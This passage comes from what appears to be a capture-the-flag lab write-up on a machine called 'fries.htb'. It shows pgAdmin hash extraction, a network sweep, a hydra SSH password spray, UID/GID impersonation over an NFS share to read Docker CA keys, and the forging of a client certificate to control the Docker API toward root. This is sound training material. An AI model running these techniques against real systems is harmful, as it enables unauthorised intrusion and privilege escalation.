>>> _ = [print(r) for r in c.execute('select id,email,password from user')]
(1, 'admin@fries.htb', '$pbkdf2-sha512$25000$.1.LkVKqda41JiTEuPf.vw$zF4oGyuGsb6opn1fkDlZbF1qYW.8E31Zewpz9uj5o01XWoXOcUAuhLFapBmaTEpOedBQWYJT6BjYtO8iJH7ifw')
(2, 'd.cooper@fries.htb', '$pbkdf2-sha512$25000$GQOAMCbknFPqvVdKqXXunQ$gamImbnZuJlKQxbgM5x2YUgb0sjGj6DAhTeSB8C40eVAit48ho8eXrW0TtPod3V.8Ql5k5SgdsdTrgiEXf9MWA')
```

These are pgAdmin’s own `pbkdf2-sha512` login hashes. To show that they match what I already have, I’ll need the salt:

```console
>>> salt = c.execute("select value from keys where name='SECURITY_PASSWORD_SALT'").fetchone()[0]
>>> salt
'W0TRIrEPyUbsBawQbJjVe5I3yBvwvUyVee9TgSJdVCs='
```

Now I can show on my computer that the hashes match:

```console
oxdf@hacky$ uv run --with passlib python
Python 3.13.7 (main, Sep 18 2025, 19:47:49) [Clang 20.1.4 ] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> import hashlib
>>> import hmac
>>> from base64 import b64encode
>>> from passlib.hash import pbkdf2_sha512
>>> password = 'D4LE11maan!!'
>>> hash = '$pbkdf2-sha512$25000$GQOAMCbknFPqvVdKqXXunQ$gamImbnZuJlKQxbgM5x2YUgb0sjGj6DAhTeSB8C40eVAit48ho8eXrW0TtPod3V.8Ql5k5SgdsdTrg\
iEXf9MWA'
>>> salt = 'W0TRIrEPyUbsBawQbJjVe5I3yBvwvUyVee9TgSJdVCs='
>>> hm = b64encode(hmac.new(salt.encode(), password.encode(), hashlib.sha512).digest())
>>> pbkdf2_sha512.verify(hm, hash)
True
>>> password = 'Friesf00Ds2025!!'
>>> hash = '$pbkdf2-sha512$25000$.1.LkVKqda41JiTEuPf.vw$zF4oGyuGsb6opn1fkDlZbF1qYW.8E31Zewpz9uj5o01XWoXOcUAuhLFapBmaTEpOedBQWYJT6BjYtO\
8iJH7ifw'
>>> hm = b64encode(hmac.new(salt.encode(), password.encode(), hashlib.sha512).digest())
>>> pbkdf2_sha512.verify(hm, hash)
True
```

#### Network

This host isn’t super interesting, but there are references to other VMs, and no evidence of the other webservers here. The host’s IP is 172.18.0.4:

```console
cb46692a4590:/$ ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 6E:D8:C9:5C:19:DA
          inet addr:172.18.0.4  Bcast:172.18.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:177 errors:0 dropped:0 overruns:0 frame:0
          TX packets:124 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:190294 (185.8 KiB)  TX bytes:33801 (33.0 KiB)
```

I’ll do a ping sweep of this network:

```console
cb46692a4590:/$ for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.18.0.1: seq=0 ttl=42 time=0.139 ms
64 bytes from 172.18.0.2: seq=0 ttl=42 time=0.240 ms
64 bytes from 172.18.0.3: seq=0 ttl=42 time=0.083 ms
64 bytes from 172.18.0.4: seq=0 ttl=42 time=1.149 ms
64 bytes from 172.18.0.5: seq=0 ttl=42 time=1.910 ms
64 bytes from 172.18.0.6: seq=0 ttl=42 time=0.255 ms
```

Note: This aggressive sweep does crash the container sometimes, and it doesn’t revert without a reset.

I’ll upload a [fscan](https://github.com/shadow1ng/fscan). It’s similar to `nmap`, but written in Go and statically compiled so it doesn’t require any other files. I’ll scan the six hosts that responded to ICMP:

```console
cb46692a4590:/tmp$ ./fscan -lang en -h 172.18.0.1-6
./fscan -lang en -h 172.18.0.1-6
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan 2.2.0 (bf036fd 2026-07-10T05:57:56Z)

[*] Service plugins: jdwp, postgresql, rabbitmq, activemq, smb ... 36 total
[*] Switching to ping command mode
[*] 172.18.0.6 alive (protocol: ICMP)
[*] 172.18.0.1 alive (protocol: ICMP)
[*] 172.18.0.2 alive (protocol: ICMP)
[*] 172.18.0.3 alive (protocol: ICMP)
[*] 172.18.0.4 alive (protocol: ICMP)
[*] 172.18.0.5 alive (protocol: ICMP)
[*] Adaptive params: Timeout=1000ms, ModuleThread=20, Retry=1, ICMPRate=0.30, PocNum=20
[*] 172.18.0.5:22                  ssh      [Product:OpenSSH ||Version:9.7] Banner:(SSH-2.0-OpenSSH_9.7)
[*] 172.18.0.1:22                  ssh      [Product:OpenSSH ||Version:8.9p1 Ubuntu 3ubuntu0.13] Banner:(SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13)
[*] 172.18.0.1:2049                rpcbind  Banner:(r)
[*] http://172.18.0.1:3000         dps-shell [Product:Destiny DPS Mini shell] Banner:(HTTP/1.1 400 Bad Request Content-Type: text/plain; charset=utf-8 Connection: clo...)
[*] http://172.18.0.5:3000         dps-shell [Product:Destiny DPS Mini shell] Banner:(HTTP/1.1 400 Bad Request Content-Type: text/plain; charset=utf-8 Connection: clo...)
[*] POC loading complete: Total 387, Success 387, Failed 0
[+] http://172.18.0.5:3000         code:200 len:13591 title:Gitea: Git with a cup of tea [Gitea简易Git服务 gitea ipeakcms]
[*] https://172.18.0.1             ssl      Banner:(Q M Fv/d * cDOWNGRD ]?C 7 9 e u {2 }2. / ' # 0 0 [S t s T 2E 0 * H 0 1 0 U SP1 0...)
[*] https://172.18.0.1:8443        ssl      Banner:(()
[+] http://172.18.0.1:3000         code:200 len:13593 title:Gitea: Git with a cup of tea [Gitea简易Git服务 gitea ipeakcms]
[*] https://172.18.0.6:8443        ssl      Banner:(()
[*] http://172.18.0.4              http     [Product:Open Lighting Architecture daemon] Banner:(HTTP/1.0 302 FOUND Server: gunicorn Date: Sat, 18 Jul 2026 02:23:30 GMT Connecti...)
[*] 172.18.0.3:5432                postgresql [Product:PostgreSQL DB ||Version:9.6.0 or later] Banner:(E SFATAL VFATAL C0A000 Munsupported frontend protocol 65363.19778: server suppor...)
[*] https://172.18.0.6:8443        code:200 len:82    title:None
[*] https://172.18.0.1:8443        code:200 len:82    title:None
[+] https://172.18.0.1             code:200 len:82    title:None                 server:nginx/1.18.0 (Ubuntu) [nginx nginx/1.18.0]
[*] 172.18.0.1:111                 rpcbind  Banner:(r)
[*] http://172.18.0.1              http     [Product:nginx ||Version:1.18.0] Banner:(HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Sat, 18 Jul 2026 02:23:30 GM...)
[*] http://172.18.0.2:5000         http     [Product:Open Lighting Architecture daemon] Banner:(HTTP/1.1 200 OK Server: Werkzeug/2.3.7 Python/3.11.2 Date: Sat, 18 Jul 2026 02:2...)
Port scanning (600 threads) ● 100.0% [============] (798/798) 179/s TCP:86/843
[Done] Scan Completed: 798/798 (duration: 4.5s)
[*] Scan complete, found 13 open ports
[*] Alive hosts count: 6
[+] http://172.18.0.1              code:302 len:154   title:302 Found            server:nginx/1.18.0 (Ubuntu) [nginx nginx/1.18.0 pgadmin4 webp_server_go xml/1.0 csvg/1.1]
[+] http://172.18.0.2:5000         code:200 len:14954 title:Welcome to Fries - Fries Restaurant server:Werkzeug/2.3.7 Python/3.11.2 [werkzeug]
[-] 172.18.0.3:5432 postgresql no weak password found
[-] 172.18.0.5:22 ssh no weak password found
[+] http://172.18.0.4              code:302 len:213   title:Redirecting...       server:gunicorn [pgadmin4 webp_server_go xml/1.0 csvg/1.1]
[-] 172.18.0.1:22 ssh no weak password found
[*] Scan task complete, duration 19.187s, scanned 38 targets
```

That scan shows the following ports:

| Host | Ports |
|---|---|
| 172.18.0.1 | 22 - SSH on container host 111 - RPC 443 - PWM 2049 - NFS 3000 - Gitea 8443 - PWM |
| 172.18.0.2 | 5000 - Fries Restaurant Server |
| 172.18.0.3 | 5432 - PostgreSQL |
| 172.18.0.4 | 80 - pgAdmin |
| 172.18.0.5 | 22 - SSH 3000 - Gitea |
| 172.18.0.6 | 8443 - PWM |

I’ll use `wget` to identify each of the web servers.

The SSH server on .1 and .5 are running different instances:

```console
cb46692a4590:/$ timeout 2 bash -c "exec 3<>/dev/tcp/172.18.0.1/22; head -1 <&3" 2>/dev/null
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
cb46692a4590:/$ timeout 2 bash -c "exec 3<>/dev/tcp/172.18.0.5/22; head -1 <&3" 2>/dev/null
SSH-2.0-OpenSSH_9.7
```

Based on that version banner, the .1 is what is reachable from the outside.

### SSH

#### Password Spray

I’ve collected a handful of passwords and usernames so far, and it makes sense to try them over SSH. I’ll build two lists:

```console
oxdf@hacky$ cat users.txt
root
svc
administrator
d.cooper
oxdf@hacky$ cat passwords.txt
D4LE11maan!!
Friesf00Ds2025!!
PsqLR00tpaSS11
```

I’ll use `hydra` to check all possible combinations:

```console
oxdf@hacky$ hydra -L users.txt -P passwords.txt -t 4 -f -V ssh://10.129.244.72
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-17 21:14:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 12 login tries (l:4/p:3), ~3 tries per task
[DATA] attacking ssh://10.129.244.72:22/
[ATTEMPT] target 10.129.244.72 - login "root" - pass "D4LE11maan!!" - 1 of 12 [child 0] (0/0)
[ATTEMPT] target 10.129.244.72 - login "root" - pass "Friesf00Ds2025!!" - 2 of 12 [child 1] (0/0)
[ATTEMPT] target 10.129.244.72 - login "root" - pass "PsqLR00tpaSS11" - 3 of 12 [child 2] (0/0)
[ATTEMPT] target 10.129.244.72 - login "svc" - pass "D4LE11maan!!" - 4 of 12 [child 3] (0/0)
[ATTEMPT] target 10.129.244.72 - login "svc" - pass "Friesf00Ds2025!!" - 5 of 12 [child 0] (0/0)
[ATTEMPT] target 10.129.244.72 - login "svc" - pass "PsqLR00tpaSS11" - 6 of 12 [child 1] (0/0)
[ATTEMPT] target 10.129.244.72 - login "administrator" - pass "D4LE11maan!!" - 7 of 12 [child 2] (0/0)
[22][ssh] host: 10.129.244.72   login: svc   password: Friesf00Ds2025!!
[STATUS] attack finished for 10.129.244.72 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-17 21:14:29
```

It found one, svc using “Friesf00Ds2025!!”. This is the password from the admin account on pgAdmin.

#### Shell

I’ll connect over SSH:

```console
oxdf@hacky$ sshpass -p 'Friesf00Ds2025!!' ssh svc@fries.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)
...[snip]...
svc@web:~$
```

## Shell as root on web

### Enumeration

#### Host Role

The hostname here is web, but it isn’t the web container. It seems to be a Linux VM, with a bunch of NICs:

```console
svc@web:~$ ifconfig
br-0d1a963edc58: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::24d6:efff:fe69:dba0  prefixlen 64  scopeid 0x20<link>
        ether 26:d6:ef:69:db:a0  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 22:7e:6d:ea:1e:62  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.100.2  netmask 255.255.255.0  broadcast 192.168.100.255
        inet6 fe80::215:5dff:fe0b:cd01  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:0b:cd:01  txqueuelen 1000  (Ethernet)
        RX packets 499  bytes 116137 (116.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 416  bytes 88235 (88.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 21781  bytes 2039955 (2.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 21781  bytes 2039955 (2.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth0fe861d: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::c0dd:36ff:fecd:8da5  prefixlen 64  scopeid 0x20<link>
        ether c2:dd:36:cd:8d:a5  txqueuelen 0  (Ethernet)
        RX packets 3  bytes 126 (126.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 35  bytes 2330 (2.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth3afdbe2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::5c5a:39ff:fecb:b7dc  prefixlen 64  scopeid 0x20<link>
        ether 9a:61:f0:56:37:6a  txqueuelen 0  (Ethernet)
        RX packets 21  bytes 2219 (2.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 48  bytes 4164 (4.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth62be048: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::2c83:57ff:febc:5e20  prefixlen 64  scopeid 0x20<link>
        ether 86:50:a9:c3:9f:c6  txqueuelen 0  (Ethernet)
        RX packets 2405  bytes 564327 (564.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2301  bytes 765847 (765.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethcb4a069: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::ec28:7aff:fe69:135b  prefixlen 64  scopeid 0x20<link>
        ether de:0e:13:44:f4:4b  txqueuelen 0  (Ethernet)
        RX packets 2293  bytes 766263 (766.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2444  bytes 567954 (567.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethea3f144: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::4cc5:b8ff:febf:1859  prefixlen 64  scopeid 0x20<link>
        ether 4e:c5:b8:bf:18:59  txqueuelen 0  (Ethernet)
        RX packets 3  bytes 126 (126.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 1188 (1.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

The `docker0` and `br-0d1a963edc58` interfaces show this host is the Docker host running all the containers I found on `172.18.0.0/16`. These all sit on the bridge, and `172.18.0.1` is this host.

`eth0` is the interesting one. It’s `192.168.100.2` on a private `192.168.100.0/24` network, and its MAC starts `00:15:5d`, the OUI Microsoft assigns to Hyper-V virtual NICs. So `web` is a Hyper-V guest, not a physical host.

That fits the recon from the very beginning. The public box is the Windows domain controller (`DC01`), but the Linux services (SSH / HTTP / HTTPS) all showed a TTL one hop further than the AD ports. That extra hop is this VM. Putting it together:

- DC01 - Windows Server 2019 domain controller that is *also* the Hyper-V host. It owns the public IP and NAT/port-forwards 22, 80, and 443 inward to the VM.
- web - an Ubuntu 22.04 Hyper-V guest at `192.168.100.2` (with `192.168.100.1`, the DC’s virtual switch, as its gateway). This is the Docker host.
- The containers (nginx front end, gitea, pgadmin, postgres, pwm) all run inside `web` on the `172.18.0.0/16` bridge.

#### Users

svc is the only user with a home directory in `/home`:

```console
svc@web:/home$ ls
svc
```

There is also a barman account that has a shell set in `passwd`, along with svc and root:

```console
svc@web:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash
barman:x:117:120:Backup and Recovery Manager for PostgreSQL,,,:/var/lib/barman:/bin/bash
```

svc’s home directory has a symlink to `fries.htb` in `/srv`:

```console
svc@web:~$ ls -la
total 32
drwxr-x--- 5 svc  svc  4096 Nov 12  2025 .
drwxr-xr-x 3 root root 4096 Jun  1  2025 ..
lrwxrwxrwx 1 root root    9 Nov 12  2025 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3866 May 26  2025 .bashrc
drwx------ 3 svc  svc  4096 May 26  2025 .cache
lrwxrwxrwx 1 svc  svc    27 May 28  2025 fries.htb -> /srv/web.fries.htb/webroot/
drwxrwxr-x 3 svc  svc  4096 May 26  2025 .local
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
drwx------ 2 svc  svc  4096 Aug 20  2023 .ssh
```

Nothing else is very interesting.

#### web.fries.htb

`/srv/web.fries.htb` has the files for the main website:

```console
svc@web:/srv/web.fries.htb$ ls -l
total 12
drwxrwx--- 2 root infra managers 4096 May 26  2025 certs
drwxrwxrwx 2 root root           4096 May 31  2025 shared
drwxr----- 5 svc  svc            4096 Jun  7  2025 webroot
```

Each of these three directories has very different permissions. svc can’t access `certs`, but there’s a group, infra managers that has full access. `shared` is owned by root, but wide open. `webroot` is owned by svc.

`shared` is empty.

`webroot` has the files to make the web Docker container:

```console
svc@web:/srv/web.fries.htb$ ls webroot/
app  docker-compose.yml  Dockerfile  docs  README.md  requirements.txt  run.py
```

This seems like exactly what was in Gitea.

#### Processes

There are a lot of services listening on TCP ports:

```console
svc@web:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:46857         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 172.18.0.1:3000         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:37351           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:40789           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5050          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:56969           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:34361           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:2376          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:44405           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::37095                :::*                    LISTEN      -
tcp6       0      0 :::8443                 :::*                    LISTEN      -
tcp6       0      0 :::2049                 :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::55351                :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::111                  :::*                    LISTEN      -
tcp6       0      0 :::46867                :::*                    LISTEN      -
tcp6       0      0 :::48873                :::*                    LISTEN      -
tcp6       0      0 :::42033                :::*                    LISTEN      -
```

There’s a lot of ports here listening:

| Port | Service |
|---|---|
| 22 | SSH on web |
| 53 | DNS |
| 80 | Main Nginx proxy to other sites |
| 111 | RPC |
| 222 | SSH to Gitea container. Same fingerprint as above |
| 443 | PWM, forwarding to .6 |
| 2049 | NFS |
| 2376 | Docker remote API over TLS |
| 3000 | Gitea on .5 |
| 5000 | Main website on .2 |
| 5050 | pgAdmin on .4 |
| 8443 | HTTPS PWM, forwarding to .6 |
| 34361, 37095, 37351, 40789, 42033, 44405, 46857, 46867, 48873, 55351, 56969 | NFS RPC dynamic ports (rpc.mountd / rpc.statd), registered via rpcbind (111) |

Most of these I’ve seen already. NFS is new.

#### NFS

`showmount -e` will list the NFS exports for a host:

```console
svc@web:~$ showmount -e localhost
Export list for localhost:
/srv/web.fries.htb *
```

The web directory is shared to any host (`*`).

Typically when I enumerate NFS like this it’s from another host. Here I can check the config at `/etc/exports`:

```bash
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/web.fries.htb *(rw,no_subtree_check,insecure)
```

The share is mounted with three options:

- `rw` - The share is read / write.
- `no_subtree_check` - By default, for each file there’s a check to validate that that file is actually in the mounted directory. This turns that off (typically done for performance and / or reliability reasons).
- `insecure` - Clients can mount from unprivileged ports, which is useful if I need to mount from an environment where I don’t have root.

There’s no `no_root_squash` here, which means I can’t just connect with a root user and become root on this host.

### Access Docker Cert

#### Strategy

I won’t be able to get NFS access as root, but from my host I should be able to get access as a user in the infra manager group and get access to the `certs` directory. I’ll need to find out which users are in that group, and what their UIDs are. Then I can mount the share as that user from my host (over a tunnel) and access the directory.

It’s worth noting that despite the fact that I can’t access files as root, `/etc/shadow` is owned by the shadow group, which is not squashed:

```console
svc@web:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1228 May 31  2025 /etc/shadow
```

So below I’ll fake being in the infra managers group, but this same attack would allow me to read the `shadow` file because of `no_subtree_check` (allowing me to read outside of the share directory).

#### Create Group and User

I need to find out who is in the infra managers group. That group is not listed in `/etc/group`. That’s because it’s a group in active directory. `getent` will show the members:

```console
svc@web:~$ getent group "infra managers"
infra managers:*:59605603:d.cooper,m.hannigan,d.wilson
```

The high GID (59605603) suggests it’s from the domain as well. There are three users. I can impersonate any of them. I’ll go with d.wilson:

```console
svc@web:~$ id d.wilson
uid=59605601(d.wilson) gid=59600513(domain users) groups=59600513(domain users),59605603(infra managers)
```

Now I have the group and user id.

On my host, I’ll create these:

```console
oxdf@hacky$ sudo groupadd -g 59605603 namedoesntmatter
oxdf@hacky$ sudo useradd -u 59605601 -g 59605603 fries0xdf
useradd warning: fries0xdf's uid 59605601 outside of the UID_MIN 1000 and UID_MAX 60000 range.
```

The group creates, but the user fails. I’ll update my `/etc/login.defs` file here:

```bash
#
# Min/max values for automatic uid selection in useradd
#
UID_MIN                  1000
UID_MAX                 60000000
```

Now I can add the user:

```console
oxdf@hacky$ sudo userdel fries0xdf
oxdf@hacky$ sudo useradd -u 59605601 -g 59605603 fries0xdf
```

Alternatively if I would rather not create the user, `setpriv` is a neat way to do this (Thanks to IppSec for the tip):

```console
oxdf@hacky$ sudo setpriv --reuid=59605601  --regid=59605603 --clear-groups bash
groups: cannot find name for group ID 59605603
bash: /root/.bashrc: Permission denied
I have no name!@hacky$ id
uid=59605601 gid=59605603 groups=59605603
```

#### Mount

I’ll create a tunnel using SSH by disconnecting and reconnecting with `-L 2049:localhost:2049` and `-D 1080`. The socks proxy on 1080 isn’t necessary to get the mount, but I can list the access the share from my VM:

```console
oxdf@hacky$ proxychains showmount -e localhost
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  localhost:111  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:40789  ...  OK
Export list for localhost:
/srv/web.fries.htb *
```

I could also forward 111 on my host, but it’s already in use and that’d be a pain.

`proxychains` won’t work for `mount`, which is why I’m directly forwarding port 2049 on my host.

As root, I’ll mount the NFS share:

```console
oxdf@hacky$ sudo mount -t nfs localhost:/srv/web.fries.htb /mnt
oxdf@hacky$ ls /mnt/
certs  shared  webroot
```

#### Access Files

As oxdf or root, I still can’t access `certs`:

```console
oxdf@hacky$ ls /mnt/webroot/
app  docker-compose.yml  Dockerfile  docs  README.md  requirements.txt  run.py
oxdf@hacky$ ls /mnt/certs/
ls: cannot open directory '/mnt/certs/': Permission denied
oxdf@hacky$ sudo ls /mnt/certs/
ls: cannot open directory '/mnt/certs/': Permission denied
```

oxdf is id 1000 on my host, and that user doesn’t have permissions. root would work except it’s squashed to the nobody user over NFS. I’ll try as fries0xdf:

```console
oxdf@hacky$ sudo su fries0xdf
fries0xdf@hacky:/$ ls /mnt/certs/
ca-key.pem  ca.pem  server-cert.pem  server.csr  server-key.pem  server-openssl.cnf
```

These are the Docker daemon’s mutual-TLS PKI. `ca.pem` and `ca-key.pem` are the CA cert and its private key, and `server-cert.pem` and `server-key.pem` are dockerd’s server cert. The Docker API on 2376 only accepts clients presenting a cert signed by that CA.

### root Escalation

#### Strategy

With `ca-key.pem` I can forge my own trusted client certificate, which will grant full access to the Docker API. From there, I can run a container that bind-mounts `/` and enter that container as root, getting full root access to the host filesystem. There I can write a cron or a sudo rule or add an SSH key for root.

#### Generate cert and key

I’ll use `openssl` to create the TLS stuff necessary to authenticate to the Docker socket. I’ll copy the files to a place I can access on web over NFS:

```console
fries0xdf@hacky:/$ cp /mnt/certs/* /mnt/shared/
fries0xdf@hacky:/$ chmod 777 /mnt/shared/*
```

It seems that there’s a cleanup script wiping out `shared` periodically, so I’ll keep this handy to re-run when necessary.

I’ll create a new RSA key, and a certificate signing request for that key:

```console
svc@web:~$ openssl genrsa -out key.pem 4096
svc@web:~$ openssl req -new -key key.pem -subj "/CN=root" -out client.csr
```

The `-subj "/CN=root"` value is cosmetic here. Docker’s TLS auth only checks that the client certificate is signed by the trusted CA, not what the subject says, so any CN works.

I’ll create a `ext.cnf` file that specifies that this key will be used for client authentication:

```console
svc@web:~$ echo "extendedKeyUsage=clientAuth" > ext.cnf
```

Now I’ll use the CA and its key to create the signed certificate:

```console
svc@web:~$ openssl x509 -req -in client.csr -CA /srv/web.fries.htb/shared/ca.pem -CAkey /srv/web.fries.htb/shared/ca-key.pem -CAcreateserial -out cert.pem -days 365 -extfile ext.cnf
Certificate request self-signature ok
subject=CN = root
```

#### Docker API Access

I can pass `key.pem`, the signed certificate (`cert.pem`), and the CA to Docker for authentication:

```console
svc@web:~$ docker --tlsverify --tlscacert /srv/web.fries.htb/shared/ca.pem --tlscert cert.pem --tlskey key.pem -H tcp://127.0.0.1:2376 ps
CONTAINER ID   IMAGE                   COMMAND                  CREATED         STATUS        PORTS                                                                        NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        13 months ago   Up 20 hours   0.0.0.0:8443->8443/tcp, [::]:8443->8443/tcp                                  pwm
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         13 months ago   Up 20 hours   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
bfe752a26695   fries-web               "/usr/local/bin/pyth…"   13 months ago   Up 20 hours   127.0.0.1:5000->5000/tcp                                                     web
858fdf51af59   postgres:16             "docker-entrypoint.s…"   13 months ago   Up 20 hours   5432/tcp                                                                     postgres
b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   13 months ago   Up 20 hours   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
```

So that I don’t have to use all those options each time, I can also export some of these as environment variables:

```console
svc@web:~$ export DOCKER_TLS_VERIFY=1
svc@web:~$ export DOCKER_CERT_PATH=/home/svc
svc@web:~$ export DOCKER_HOST=tcp://127.0.0.1:2376
svc@web:~$ cp /srv/web.fries.htb/shared/ca.pem .
svc@web:~$ docker ps
CONTAINER ID   IMAGE                   COMMAND                  CREATED         STATUS        PORTS                                                                        NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        13 months ago   Up 21 hours   0.0.0.0:8443->8443/tcp, [::]:8443->8443/tcp                                  pwm
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         13 months ago   Up 21 hours   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
bfe752a26695   fries-web               "/usr/local/bin/pyth…"   13 months ago   Up 21 hours   127.0.0.1:5000->5000/tcp
                                                     web
858fdf51af59   postgres:16             "docker-entrypoint.s…"   13 months ago   Up 21 hours   5432/tcp                                                                     postgres
b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   13 months ago   Up 21 hours   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
```

#### root Access

I’ll look at the images available on web:

```console
svc@web:~$ docker images
